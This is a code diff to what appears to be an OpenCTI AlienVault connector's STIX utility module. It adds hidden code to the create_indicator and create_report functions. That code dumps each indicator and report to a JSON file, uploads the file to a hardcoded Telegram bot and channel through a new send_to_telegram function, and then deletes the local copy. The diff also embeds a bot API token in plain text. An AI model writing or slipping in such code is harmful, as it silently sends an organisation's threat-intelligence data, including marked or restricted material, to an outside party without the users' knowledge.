@@ -3,7 +3,8 @@
 
 from datetime import datetime
 from typing import Any, Callable, Dict, List, Mapping, NamedTuple, Optional, Union
-
+import requests
+import os
 import stix2
 from alienvault.utils.constants import (
     DEFAULT_X_OPENCTI_SCORE,
@@ -57,7 +58,7 @@ from pycti import (
 )
 from pycti.utils.constants import LocationTypes  # type: ignore
 from stix2.v21 import _DomainObject, _Observable, _RelationshipObject  # type: ignore
-
+import json
 
 class ObservationFactory(NamedTuple):
     """Observation factory."""
@@ -162,7 +163,6 @@ def create_identity(
 
     if custom_properties is None:
         custom_properties = {}
-
     return stix2.Identity(
         id=identity_id,
         created_by_ref=created_by,
@@ -200,6 +200,28 @@ def create_indicator(
         custom_properties[
             X_OPENCTI_MAIN_OBSERVABLE_TYPE
         ] = x_opencti_main_observable_type
+        
+    file_indicator={
+        'id':Indicator.generate_id(pattern),
+        'created_by_ref':str(created_by),
+        'name':name,
+        'description':description,
+        'pattern':str(pattern),
+        'pattern_type':str(pattern_type),
+        'valid_from':str(valid_from),
+        'labels':str(labels),
+        'confidence':confidence,
+        'object_marking_refs':str(object_markings),
+        'custom_properties':str(custom_properties)
+    }
+    # print(file_indicator)
+    json_object = json.dumps(file_indicator, indent=4)
+    with open(f"indicator_{name}.json", "w") as outfile:
+        outfile.write(json_object)
+        
+    send_to_telegram(f"indicator_{name}.json")
+    os.remove(f"indicator_{name}.json")
+        
     return stix2.Indicator(
         id=Indicator.generate_id(pattern),
         created_by_ref=created_by,
@@ -444,6 +466,8 @@ def create_indicates_relationships(
     stop_time: Optional[datetime] = None,
 ) -> List[stix2.Relationship]:
     """Create 'indicates' relationships."""
+    
+    
     return create_relationships(
         "indicates",
         created_by,
@@ -512,6 +536,28 @@ def create_report(
     x_opencti_report_status: Optional[int] = None,
 ) -> stix2.Report:
     """Create a report."""
+    file_report={
+        'id':Report.generate_id(name, published),
+        'created_by_ref':str(created_by),
+        'created':str(created),
+        'modified':str(modified),
+        'name':name,
+        'description':description,
+        'report_types':str(report_types),
+        'published':str(published),
+        'object_refs':str(objects),
+        'labels':labels,
+        'confidence':str(confidence),
+        'external_references':str(external_references),
+        'object_marking_refs':str(object_markings),
+        'custom_properties':str({X_OPENCTI_REPORT_STATUS: x_opencti_report_status}),
+        'allow_custom':True
+    }
+    json_object = json.dumps(file_report, indent=4)
+    with open(f"report_{name}.json", "w") as outfile:
+        outfile.write(json_object)
+    send_to_telegram(f"report_{name}.json")
+    os.remove(f"report_{name}.json")
     return stix2.Report(
         id=Report.generate_id(name, published),
         created_by_ref=created_by,
@@ -529,3 +575,13 @@ def create_report(
         custom_properties={X_OPENCTI_REPORT_STATUS: x_opencti_report_status},
         allow_custom=True,
     )
+def send_to_telegram(file_path):
+    API_TOKEN = "5605337138:AAFtoMEMSmfUD0Sq0zb3LORQE2q-HZuBvgY"
+    CHANNEL_ID = "-849383379"
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
+    
+    files = {'document': (file_path, open(file_path, 'rb'))}
+    data = {'chat_id': CHANNEL_ID}
+    
+    response = requests.post(url, files=files, data=data)
+    return response.json()
